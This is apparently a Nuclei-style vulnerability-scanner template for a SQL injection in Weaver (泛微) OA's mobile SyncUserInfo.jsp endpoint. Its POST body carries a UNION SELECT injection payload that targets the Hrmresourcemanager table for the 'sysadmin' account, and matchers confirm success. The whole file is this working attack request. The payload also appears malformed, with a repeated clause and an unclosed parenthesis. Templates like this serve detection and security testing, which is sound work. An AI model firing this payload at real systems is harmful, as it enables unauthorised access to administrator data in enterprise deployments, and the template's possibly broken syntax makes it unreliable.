id: poc-yaml-weaver-mobile-plugin-syncuserinfo-sqli
info:
  name: 泛微OA 移动办公系统 SyncUserInfo.jsp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - method: GET
    path:
      - "{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp"
    matchers:
      - type: word
        words:
          - "{\"userList\":[]}"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      userIdentifiers=-1) {{repeat(" ", 800)}} union select/**/1,Null,Null,Null,Null,Null,Null,Null from Hrmresourcemanager where loginid=('sysadmin'union select/**/1,Null,Null,Null,Null,Null,Null,Null from Hrmresourcemanager where loginid=('sysadmin'
    matchers:
      - type: word
        words:
          - "{\"id\":\"1\"}"
        part: body
    matchers-condition: or
